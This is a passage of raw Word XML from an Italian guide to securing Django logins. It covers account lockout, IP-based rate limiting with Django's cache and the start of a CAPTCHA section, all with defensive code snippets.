            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Troppi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>tentativi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">. Account </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>bloccato</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> 5 min.", status=403)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7658237E" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7A92471E" w14:textId="2E568280" w:rsidR="002F0F19" w:rsidRPr="002F0F19" w:rsidRDefault="002F0F19" w:rsidP="002F0F19">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">    return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="002F0F19">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="43E591D0" w14:textId="0C8E60E4" w:rsidR="00E07933" w:rsidRDefault="00E07933"/>
    <w:p w14:paraId="2AFE90D1" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>2. Rate Limiting API / Login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03067BD8" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">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Descrizione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC9BFBF" w14:textId="14782DF5" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Limita</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> il numero di richieste al login dall’IP o utente con un modulo semplice.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CDD7A9" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">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Esempio con Django cache</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w14:paraId="0BC0B68E" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="68022215"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from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>django.core</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>.cache</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import cache</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34E27FFB" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="70549FCA"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def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_rate_limit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(request):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7982FFE4"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>request.META.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>('REMOTE_ADDR')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="319FC33E"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key = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>rl</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>_{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>}"</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
          </w:p>
          <w:p w14:paraId="5911ED46"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attempts = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.get</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>key, 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FC888C6" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6B33CE72"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if attempts &gt; 20:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D83E64C"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return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>HttpResponse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>Troppi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>accessi</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> da </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>questo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> IP.", status=429)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0826C742" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="52B6D3B1"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w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>cache.set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>key, attempts + 1, timeout=60</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)  #</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> 60 sec</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B8FEE95" w14:textId="4AE4074A" w:rsidR="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">    return None</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="78F41920" w14:textId="77777777" w:rsidR="002F0F19" w:rsidRDefault="002F0F19"/>
    <w:p w14:paraId="77975DDD" w14:textId="45DA29EA" w:rsidR="00E603E1" w:rsidRDefault="00E603E1">
      <w:r w:rsidRPr="00E603E1">
        <w:t xml:space="preserve">Poi </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>richiamarla</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E603E1">
        <w:t xml:space="preserve"> prima di ogni login:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabel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2"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w:rsidRPr="00E603E1" w14:paraId="3FBDCF09" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="68A7ACFC" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>lim_response</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_rate_limit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(request)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03A43557"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if </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>lim_response</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C9448E8" w14:textId="4D9EEC66" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">    return </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>lim_response</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7307A9D0" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D4685CE" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>3. Aggiungere CAPTCHA nei login dopo tentativi falliti</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3587EE1A" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">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Descrizione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC6331D" w14:textId="1015A2C2" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Mostra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> un CAPTCHA solo dopo X tentativi falliti.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A3A6F1" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">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Esempio in Django</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w14:paraId="530A9E5F" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="5428F59B"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from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>django</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import forms</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4263148C"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from </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>captcha.fields</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> import </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>CaptchaField</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
          <w:p w14:paraId="6E182582" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2F63E696" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">class </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
